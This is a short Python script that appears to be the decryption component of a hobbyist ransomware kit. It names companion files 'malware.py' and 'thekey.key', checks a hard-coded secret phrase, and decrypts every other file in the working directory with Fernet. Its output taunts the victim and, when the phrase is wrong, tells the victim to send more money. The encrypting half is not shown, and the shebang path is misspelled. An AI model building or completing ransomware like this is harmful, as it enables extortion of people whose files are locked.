#!/user/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files

files = []
for  file in os.listdir():
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py" :
		continue
	if os.path.isfile(file):
		files.append(file)
#print(files)
with open("thekey.key", "rb") as key:
	secretkey = key.read()
secretphrase = "mandir_ka_ghanta"
user_phrase = input("Enter the secret phrase to decrypt your file: ")
if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as  thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Conrats!!! u saved ur fishes.....Don't be mandir ka ghanta again")
else:
	print("Sorry wrong secret phrase. Send me more money in the same account")
